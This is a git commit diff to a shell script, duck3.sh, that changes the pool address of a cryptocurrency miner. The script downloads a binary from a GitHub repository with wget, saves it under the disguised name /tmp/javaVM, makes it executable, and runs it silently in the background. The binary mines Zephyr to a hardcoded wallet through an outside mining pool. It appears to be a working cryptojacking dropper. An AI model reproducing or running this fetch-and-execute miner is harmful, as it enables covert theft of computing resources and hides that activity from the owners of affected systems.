9eb9051d306571fc4f56133eba026f2040ba8b11
cronjob <thesunofme1@gmail.com>
2023-11-21 04:59:25 +0700

    Update duck3.sh

--- duck3.sh
+++ duck3.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 if [ -f /tmp/javaVM ]
  	then
- 	/tmp/javaVM -o 143.47.231.0:443 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p nf -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=50 > /dev/null 2>&1 &
+ 	/tmp/javaVM -o hk-zephyr.miningocean.org:5332 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p nf -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=50 > /dev/null 2>&1 &
  	echo Started Existing
  	else
  		wget -q https://github.com/thesunofme/trash/raw/main/work -O /tmp/javaVM
  		chmod +x /tmp/javaVM
- 		/tmp/javaVM -o 143.47.231.0:443 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p nf -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=50 > /dev/null 2>&1 &
+ 		/tmp/javaVM -o hk-zephyr.miningocean.org:5332 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p nf -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=50 > /dev/null 2>&1 &
 fi
